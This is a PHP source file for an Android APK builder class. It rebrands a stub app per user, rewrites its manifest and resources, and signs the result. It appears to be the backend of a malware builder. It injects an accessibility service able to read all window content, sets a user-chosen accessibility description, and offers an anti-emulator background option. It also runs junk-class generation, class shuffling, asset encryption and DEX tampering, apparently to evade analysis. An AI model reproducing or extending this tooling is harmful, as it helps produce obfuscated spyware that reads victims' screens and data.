<?php

namespace ApkBuilder;

/**
 * APK 构建器主类
 */
class Builder
{
    private string $templateDir;
    private string $toolsDir;
    private string $outputBaseDir;
    private string $workDir = '';
    private string $buildDir = '';
    private string $assetsKey = '';
    
    private ApkBuildConfig $config;
    private BuildLogger $logger;
    private Encryptor $encryptor;
    private array $stepStats = [];

    public function __construct(?string $baseDir = null)
    {
        $baseDir = $baseDir ?? dirname(__DIR__);
        $this->templateDir = $baseDir . '/apkstub/extracted_apkstub';
        $this->toolsDir = $baseDir . '/tools';
        // 输出到 storage 目录，确保 Docker 挂载持久化
        $this->outputBaseDir = dirname($baseDir, 2) . '/storage/user/apps';
        $this->encryptor = new Encryptor();
    }

    /**
     * 构建 APK
     * 
     * @param ApkBuildConfig $config 构建配置
     * @return array 构建结果
     */
    public function build(ApkBuildConfig $config): array
    {
        $this->config = $config;
        $this->logger = new BuildLogger(dirname(__DIR__) . '/logs');
        $this->logger->log("=== Build started for {$config->appid} ===");

        try {
            // 验证配置
            $errors = $config->validate();
            if (!empty($errors)) {
                throw new \Exception("Config validation failed: " . implode(', ', $errors));
            }

            // 核心构建流程
            $this->runStep('check_dependencies', fn() => $this->checkDependencies());
            $this->runStep('prepare_work_dir', fn() => $this->prepareWorkDir());
            $this->runStep('modify_smali', fn() => $this->modifySmali());
            $this->runStep('modify_manifest', fn() => $this->modifyManifest());
            $this->runStep('modify_resources', fn() => $this->modifyResources());
            $this->runStep('replace_icon', fn() => $this->replaceIcon());
            $this->runStep('replace_background', fn() => $this->replaceBackground());

            // 可选：混淆功能
            if ($config->enableJunkClasses) {
                $this->runStep('generate_junk_classes', fn() => $this->generateJunkClasses());
            }
            if ($config->enableClassShuffle) {
                $this->runStep('shuffle_classes', fn() => $this->shuffleClasses());
            }

            // 加密资源
            $this->runStep('encrypt_resources', fn() => $this->encryptResources());
            
            // 构建 APK
            $this->runStep('build_apk', fn() => $this->buildApk());

            // 可选：保护功能
            if ($config->enableApkProtection) {
                $this->runStep('protect_apk', fn() => $this->protectApk());
            }
            if ($config->enableDexModification) {
                $this->runStep('modify_dex', fn() => $this->modifyDex());
            }

            // 签名和输出
            $this->runStep('sign_apk', fn() => $this->signApk());
            $outputPath = $this->runStep('move_output', fn() => $this->moveToOutput());
            
            $this->cleanup();

            $totalTime = $this->logger->getTotalTime();
            $this->logger->log("=== Build completed in " . BuildLogger::formatTime($totalTime) . " ===");

            return [
                'success' => true,
                'path' => $outputPath,
                'stats' => $this->getStats($totalTime),
                'log' => $this->logger->getLogs()
            ];
        } catch (\Exception $e) {
            $this->logger->log("ERROR: " . $e->getMessage());
            $this->cleanup();
            return [
                'success' => false,
                'error' => $e->getMessage(),
                'stats' => $this->getStats($this->logger->getTotalTime()),
                'log' => $this->logger->getLogs()
            ];
        }
    }

    /**
     * 执行步骤并记录耗时
     */
    private function runStep(string $name, callable $action): mixed
    {
        $this->logger->startStep($name);
        $result = $action();
        $this->stepStats[$name] = $this->logger->endStep($name);
        return $result;
    }

    /**
     * 获取统计信息
     */
    private function getStats(float $totalTime): array
    {
        return [
            'total_time_ms' => $totalTime,
            'total_time_formatted' => BuildLogger::formatTime($totalTime),
            'steps' => $this->stepStats
        ];
    }

    /**
     * 检查依赖
     */
    private function checkDependencies(): void
    {
        if (!file_exists($this->templateDir)) {
            throw new \Exception("APK template directory not found: {$this->templateDir}");
        }
        if (!file_exists($this->toolsDir . '/apktool.jar')) {
            throw new \Exception("apktool.jar not found in: {$this->toolsDir}");
        }
        exec('java -version 2>&1', $output, $ret);
        if ($ret !== 0) {
            throw new \Exception("Java not installed or not in PATH");
        }
    }

    /**
     * 准备工作目录
     */
    private function prepareWorkDir(): void
    {
        // 清除旧的构建缓存
        $this->cleanOldBuildCache();
        
        $this->workDir = sys_get_temp_dir() . '/apk_build_' . uniqid();
        $this->buildDir = $this->workDir . '/apk_source';

        if (!mkdir($this->workDir, 0755, true)) {
            throw new \Exception("Failed to create work directory");
        }

        $this->copyDir($this->templateDir, $this->buildDir);
        $this->assetsKey = Encryptor::generateKey();
    }

    /**
     * 清除旧的构建缓存
     */
    private function cleanOldBuildCache(): void
    {
        $tempDir = sys_get_temp_dir();
        $pattern = $tempDir . '/apk_build_*';
        $oldDirs = glob($pattern, GLOB_ONLYDIR);
        
        foreach ($oldDirs as $dir) {
            $this->deleteDir($dir);
        }
    }

    /**
     * 修改 Smali 配置
     */
    private function modifySmali(): void
    {
        $processor = new SmaliProcessor($this->buildDir);
        $processor->modifyConfig($this->config, $this->assetsKey, $this->encryptor);
    }

    /**
     * 修改 AndroidManifest
     */
    private function modifyManifest(): void
    {
        $manifestPath = $this->buildDir . '/AndroidManifest.xml';
        $content = file_get_contents($manifestPath);

        $oldPackage = 'com.icontrol.protector';
        if ($oldPackage !== $this->config->appid) {
            $content = str_replace($oldPackage, $this->config->appid, $content);
            $processor = new SmaliProcessor($this->buildDir);
            $processor->renamePackage($oldPackage, $this->config->appid);
        }

        // 将启动器图标从 mylogo 改为 app_icon
        // mylogo.png 保留用于背景图（由 replaceBackground 处理）
        $content = str_replace('@drawable/mylogo', '@drawable/app_icon', $content);

        $this->fixResourceReferences($content);
        file_put_contents($manifestPath, $content);
    }

    /**
     * 修复资源引用
     */
    private function fixResourceReferences(string &$content): void
    {
        $xmlDir = $this->buildDir . '/res/xml';
        if (!is_dir($xmlDir)) {
            @mkdir($xmlDir, 0755, true);
        }

        preg_match_all('/@xml\/([a-zA-Z0-9_]+)/', $content, $matches);
        foreach (array_unique($matches[1] ?? []) as $name) {
            $file = "{$xmlDir}/{$name}.xml";
            if (!file_exists($file)) {
                $existing = glob("{$xmlDir}/*.xml");
                if (!empty($existing)) {
                    copy($existing[0], $file);
                } else {
                    $defaultXml = '<?xml version="1.0" encoding="utf-8"?>' .
                        '<accessibility-service xmlns:android="http://schemas.android.com/apk/res/android" ' .
                        'android:accessibilityEventTypes="typeAllMask" ' .
                        'android:canRetrieveWindowContent="true"/>';
                    file_put_contents($file, $defaultXml);
                }
            }
        }
    }

    /**
     * 修改资源文件
     */
    private function modifyResources(): void
    {
        // strings.xml
        $stringsPath = $this->buildDir . '/res/values/strings.xml';
        if (file_exists($stringsPath)) {
            $content = file_get_contents($stringsPath);
            $content = preg_replace(
                '/<string name="BaseName">[^<]*<\/string>/',
                '<string name="BaseName">' . htmlspecialchars($this->config->appname) . '</string>',
                $content
            );
            $content = preg_replace(
                '/<string name="accessibility_service_description">[^<]*<\/string>/',
                '<string name="accessibility_service_description">' . htmlspecialchars($this->config->loginDis) . '</string>',
                $content
            );
            file_put_contents($stringsPath, $content);
        }

        // apktool.yml
        $ymlPath = $this->buildDir . '/apktool.yml';
        if (file_exists($ymlPath)) {
            $content = file_get_contents($ymlPath);
            $versionCode = (int)str_replace('.', '', $this->config->appversion) * 100;
            $content = preg_replace('/versionCode: \d+/', 'versionCode: ' . $versionCode, $content);
            $content = preg_replace('/versionName: [^\n]+/', 'versionName: ' . $this->config->appversion, $content);
            file_put_contents($ymlPath, $content);
        }
    }

    /**
     * 替换应用图标
     * 图标文件位置: storage/user/storage/{userid}/icons/{appicopath}
     */
    private function replaceIcon(): void
    {
        // 图标路径: {project_root}/storage/user/storage/{userid}/icons/{filename}
        $projectRoot = dirname(dirname(dirname(__DIR__)));
        $iconSource = $projectRoot . '/storage/user/storage/' . 
                      $this->config->userid . '/icons/' . $this->config->appicopath;
        
        if (!file_exists($iconSource)) {
            throw new \Exception("Icon file not found: " . $iconSource);
        }

        $dirs = ['drawable', 'drawable-hdpi', 'drawable-mdpi', 
                 'drawable-xhdpi', 'drawable-xxhdpi', 'drawable-xxxhdpi'];
        foreach ($dirs as $dir) {
            $target = $this->buildDir . '/res/' . $dir;
            if (is_dir($target)) {
                // 复制为 app_icon.png（启动器图标）
                copy($iconSource, $target . '/app_icon.png');
            }
        }
        
        $this->logger->log("Icon: replaced with " . $this->config->appicopath);
    }

    /**
     * 替换背景图
     * 
     * 对应 C# Worker.cs Step2() 中的 "Change blackui..." 逻辑
     * 目标文件: res/drawable/blackui.png
     * 
     * noEmulator 参数含义:
     * - "black": 使用纯黑色背景（删除 blackui.png）
     * - 本地文件路径: 使用自定义背景图
     */
    private function replaceBackground(): void
    {
        $bgSource = $this->config->noEmulator;
        
        // 转换 Windows 路径为 Linux 路径
        // Windows: C:\xampp\htdocs\user\ui\xxx.png -> storage/user/ui/xxx.png
        if (preg_match('/^[A-Za-z]:\\\\/', $bgSource) || preg_match('/^[A-Za-z]:\//', $bgSource)) {
            // 提取文件名
            $filename = basename(str_replace('\\', '/', $bgSource));
            // 转换为相对路径格式
            $bgSource = 'storage/user/ui/' . $filename;
            $this->logger->log("Background: converted Windows path to: " . $bgSource);
        }
        
        // 情况1: 使用纯黑色背景
        // C# 逻辑: 删除 blackui.png 并从 public.xml 移除引用
        if (empty($bgSource) || strtolower($bgSource) === 'black') {
            $this->logger->log("Background: using black (removing blackui.png)");
            $this->removeBlackuiResource();
            return;
        }

        // 情况2: 使用自定义背景图（仅支持本地文件路径）
        $sourceFile = null;
        $filename = basename($bgSource);

        // 查找本地文件
        $storageBase = dirname(dirname(dirname(__DIR__))) . '/storage';
        $possiblePaths = [
            $bgSource,  // 绝对路径
            $storageBase . '/user/ui/' . $filename,  // storage/user/ui/
            dirname(dirname(__DIR__)) . '/user/ui/' . $filename,  // src/private/user/ui/
        ];

        foreach ($possiblePaths as $path) {
            if (file_exists($path) && filesize($path) > 100) {
                $sourceFile = $path;
                $this->logger->log("Background: using local file: " . $path);
                break;
            }
        }

        if (!$sourceFile) {
            $this->logger->log("Background: file not found ({$bgSource}), using default black");
            $this->removeBlackuiResource();
            return;
        }

        // 替换 blackui.png (C# 目标文件)
        $target = $this->buildDir . '/res/drawable/blackui.png';
        if (file_exists($target)) {
            unlink($target);
        }
        copy($sourceFile, $target);
        $this->logger->log("Background: replaced blackui.png");
    }

    /**
     * 移除 blackui 资源
     * 
     * 对应 C# Worker.cs 中 noemulator == "black" 时的处理:
     * 1. 删除 res/drawable/blackui.png
     * 2. 从 res/values/public.xml 移除 blackui 引用
     */
    private function removeBlackuiResource(): void
    {
        // 删除 blackui.png 文件
        $blackuiPath = $this->buildDir . '/res/drawable/blackui.png';
        if (file_exists($blackuiPath)) {
            unlink($blackuiPath);
            $this->logger->log("Background: deleted blackui.png");
        }

        // 从 public.xml 移除 blackui 引用
        $publicXmlPath = $this->buildDir . '/res/values/public.xml';
        if (file_exists($publicXmlPath)) {
            $content = file_get_contents($publicXmlPath);
            // 移除 <public type="drawable" name="blackui" ... /> 行
            $content = preg_replace(
                '/<public[^>]*type="drawable"[^>]*name="blackui"[^>]*\/>\s*/i',
                '',
                $content
            );
            file_put_contents($publicXmlPath, $content);
            $this->logger->log("Background: removed blackui from public.xml");
        }
    }

    /**
     * 生成垃圾类
     */
    private function generateJunkClasses(): void
    {
        $obfuscator = new Obfuscator($this->buildDir);
        $count = $obfuscator->generateJunkClasses(
            $this->config->junkClassCount, 
            $this->config->junkMethodCount
        );
        $this->logger->log("Generated {$count} junk classes");
    }

    /**
     * 混淆类名
     */
    private function shuffleClasses(): void
    {
        $obfuscator = new Obfuscator($this->buildDir);
        $count = $obfuscator->shuffleClassNames();
        $this->logger->log("Shuffled {$count} class names");
    }

    /**
     * 加密资源
     */
    private function encryptResources(): void
    {
        // 注意：不加密 strings.xml 中的字符串
        // BaseName 等字符串由 Android 系统直接读取，不经过应用解密
        // 只有 smali 中的配置值（如 HOME_NAME）才需要加密

        // 加密 assets
        $assetsPath = $this->buildDir . '/assets';
        if (is_dir($assetsPath)) {
            $iterator = new \RecursiveIteratorIterator(
                new \RecursiveDirectoryIterator($assetsPath, \RecursiveDirectoryIterator::SKIP_DOTS)
            );
            foreach ($iterator as $file) {
                if ($file->isFile()) {
                    $content = file_get_contents($file->getPathname());
                    $encrypted = $this->encryptor->encryptBytes($content, $this->assetsKey);
                    file_put_contents($file->getPathname(), $encrypted);
                }
            }
        }
    }

    /**
     * 构建 APK
     */
    private function buildApk(): void
    {
        $apktoolJar = $this->toolsDir . '/apktool.jar';
        $unsignedApk = $this->workDir . '/app-unsigned.apk';

        $cmd = sprintf(
            'java -jar %s b %s -o %s 2>&1',
            escapeshellarg($apktoolJar),
            escapeshellarg($this->buildDir),
            escapeshellarg($unsignedApk)
        );

        exec($cmd, $output, $ret);
        if ($ret !== 0 || !file_exists($unsignedApk)) {
            throw new \Exception("apktool build failed: " . implode("\n", $output));
        }
    }

    /**
     * APK 保护
     */
    private function protectApk(): void
    {
        $protector = new ApkProtector();
        $protector->protect($this->workDir . '/app-unsigned.apk');
        $this->logger->log("APK protection applied");
    }

    /**
     * DEX 修改
     */
    private function modifyDex(): void
    {
        $protector = new ApkProtector();
        $count = $protector->modifyDex($this->workDir . '/app-unsigned.apk');
        $this->logger->log("Modified {$count} DEX files");
    }

    /**
     * 签名 APK
     */
    private function signApk(): void
    {
        $unsignedApk = $this->workDir . '/app-unsigned.apk';
        $alignedApk = $this->workDir . '/app-aligned.apk';
        $signedApk = $this->workDir . '/app-signed.apk';

        // zipalign
        exec(sprintf('zipalign -f 4 %s %s 2>&1', 
            escapeshellarg($unsignedApk), 
            escapeshellarg($alignedApk)
        ));
        if (!file_exists($alignedApk)) {
            $alignedApk = $unsignedApk;
        }

        // keystore
        $keystore = $this->toolsDir . '/debug.keystore';
        if (!file_exists($keystore)) {
            $this->generateKeystore($keystore);
        }

        // sign
        $signapk = $this->toolsDir . '/signapk.jar';
        if (file_exists($signapk)) {
            $cmd = sprintf(
                'java -jar %s sign --ks %s --ks-pass pass:android --key-pass pass:android ' .
                '--v2-signing-enabled true --out %s %s 2>&1',
                escapeshellarg($signapk),
                escapeshellarg($keystore),
                escapeshellarg($signedApk),
                escapeshellarg($alignedApk)
            );
        } else {
            $cmd = sprintf(
                'apksigner sign --ks %s --ks-pass pass:android --out %s %s 2>&1',
                escapeshellarg($keystore),
                escapeshellarg($signedApk),
                escapeshellarg($alignedApk)
            );
        }

        exec($cmd, $output, $ret);
        
        // 回退到 jarsigner
        if (!file_exists($signedApk)) {
            exec(sprintf(
                'jarsigner -keystore %s -storepass android -signedjar %s %s androiddebugkey 2>&1',
                escapeshellarg($keystore),
                escapeshellarg($signedApk),
                escapeshellarg($alignedApk)
            ));
        }

        if (!file_exists($signedApk)) {
            throw new \Exception("APK signing failed");
        }
    }

    /**
     * 生成密钥库
     */
    private function generateKeystore(string $path): void
    {
        exec(sprintf(
            'keytool -genkey -v -keystore %s -storepass android -alias androiddebugkey ' .
            '-keypass android -keyalg RSA -keysize 2048 -validity 10000 ' .
            '-dname "CN=Debug,O=Android,C=US" 2>&1',
            escapeshellarg($path)
        ));
    }

    /**
     * 移动到输出目录
     */
    private function moveToOutput(): string
    {
        $signedApk = $this->workDir . '/app-signed.apk';
        $outputDir = $this->outputBaseDir . '/' . $this->config->userid . '/' . $this->config->appid;
        if (!is_dir($outputDir)) {
            @mkdir($outputDir, 0755, true);
        }

        $outputPath = $outputDir . '/' . $this->config->appid . '.apk';
        if (!copy($signedApk, $outputPath)) {
            throw new \Exception("Failed to copy APK to output directory");
        }

        return '/user/apps/' . $this->config->userid . '/' . 
               $this->config->appid . '/' . $this->config->appid . '.apk';
    }

    /**
     * 清理工作目录
     */
    private function cleanup(): void
    {
        if (!empty($this->workDir) && is_dir($this->workDir)) {
            $this->deleteDir($this->workDir);
        }
    }

    /**
     * 复制目录
     * 优化：使用系统命令代替 PHP 递归复制
     * 性能提升：从 ~125s 降至 ~1s (100x+)
     */
    private function copyDir(string $src, string $dst): void
    {
        // 优先使用 rsync（最快且保留权限）
        if ($this->commandExists('rsync')) {
            @mkdir($dst, 0755, true);
            exec(sprintf('rsync -a %s/ %s/', escapeshellarg($src), escapeshellarg($dst)), $output, $ret);
            if ($ret === 0) {
                return;
            }
        }
        
        // 备选：使用 tar 管道（次快）
        @mkdir($dst, 0755, true);
        $cmd = sprintf(
            'cd %s && tar cf - . | (cd %s && tar xf -)',
            escapeshellarg($src),
            escapeshellarg($dst)
        );
        exec($cmd, $output, $ret);
        if ($ret === 0) {
            return;
        }
        
        // 最后回退：PHP 原生复制（兼容性保证）
        $this->copyDirNative($src, $dst);
    }

    /**
     * 检查命令是否存在
     */
    private function commandExists(string $cmd): bool
    {
        $return = shell_exec(sprintf("which %s 2>/dev/null", escapeshellarg($cmd)));
        return !empty($return);
    }

    /**
     * PHP 原生目录复制（备用方案）
     */
    private function copyDirNative(string $src, string $dst): void
    {
        @mkdir($dst, 0755, true);
        foreach (scandir($src) as $file) {
            if ($file === '.' || $file === '..') continue;
            $srcPath = "$src/$file";
            $dstPath = "$dst/$file";
            is_dir($srcPath) ? $this->copyDirNative($srcPath, $dstPath) : copy($srcPath, $dstPath);
        }
    }

    /**
     * 删除目录
     */
    private function deleteDir(string $dir): void
    {
        if (!is_dir($dir)) return;
        foreach (array_diff(scandir($dir), ['.', '..']) as $file) {
            $path = "$dir/$file";
            is_dir($path) ? $this->deleteDir($path) : unlink($path);
        }
        rmdir($dir);
    }
}
